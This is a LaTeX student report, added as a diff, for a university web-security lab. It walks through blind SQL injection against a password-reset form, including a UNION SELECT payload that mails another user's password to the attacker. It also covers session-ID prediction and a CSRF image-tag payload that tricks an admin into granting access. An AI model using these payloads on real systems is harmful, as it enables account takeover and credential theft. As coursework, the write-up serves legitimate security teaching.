@@ -1,0 +1,60 @@
+\documentclass[10pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage[english]{babel}
+\usepackage{listings}
+\author{Xavier Crochet}
+\title{LINGI2347 report}
+\begin{document}
+\maketitle
+\section{BLIND sql injection}
+\begin{itemize}
+\item{check whether they use the \begin{verbatim}mysql_real_escape_string by entering blabla'\end{verbatim} in the username field of the forget password field
+Lucky me, it raised an error, meaning that they don't use the previous method, that would simply result by telling my that the user name wasn't found. We are in the \begin{verbatim}WHERE field=\end{verbatim} part of the query}
+\item{If we input blabla or 'x'='x we get "An email has succesfuly been send to your email"}
+\end{itemize}
+So the query looks something like 
+\begin{verbatim}
+SELECT email, password from tablename where fieldname='\$USER'
+\end{verbatim} 
+We have to find tablename and fieldname
+\begin{itemize}
+\item{\begin{verbatim}' GROUP BY username ;--\end{verbatim}  there is a field called username}
+\item{\begin{verbatim}' GROUP BY user.username ;--\end{verbatim} there is a table name called user}
+\end{itemize}
+
+Now we have to forge the response in order to recieve bill's password in our email box. 
+\begin{itemize}
+\item{First, we have to find the password field name \begin{verbatim}'GROUP BY password ;--\end{verbatim}}
+\item{Then, enter the following input : \begin{verbatim}' union  select 'xavier.crochet@student.uclouvain.be', password from user where username='bill';--\end{verbatim}}
+\end{itemize}
+\section{Advanced session hijacking}
+Using webscarab, we found that the weakadvsessionid looks as follow : "XXYYYYYYYYYYYYZZ" where
+\begin{itemize}
+	\item{XX a random number generated for the user when he logs in}
+	\item{YYYYYYYYYYYYYY a string of random numbers and lowercase chars, common to all the session, regenerated every minutes}
+	\item{ZZ a number incremented each time a user logs in}
+\end{itemize} 
+
+My strategy : 
+\begin{enumerate}
+	\item{Guess ZZ by fetching several connection request with webscarab while checking the evolution of the XX part generated. When a gap appear, we know that another user has just connected himself on the website}
+	\item{Then we have about 1 minute to find the right XX before Y(...) change.The easy way is to use a small python script with the urllib2}
+\end{enumerate}
+
+\section{Cross-Site request Foregy}
+The admin have to execute the following request
+\begin{lstlisting} 
+http://matta.info.ucl.ac.be/csrf/grantupdate/bob
+\end{lstlisting}
+in order to grand update access to bob.. \\
+So, we just create a new article on bob's website containing the following code : 
+\begin{lstlisting} 
+!http://matta.info.ucl.ac.be/csrf/grantupdate/bob(COUCOU)!
+\end{lstlisting}
+The admin will just naively visit bob's webpage and execute the script wihtout knowing it
+\section{Conclusion}
+This assignment give us a quick look up of the possible basic web attack. Never trust user input, and use long enough generated key are the basic blablabla
+\end{document}
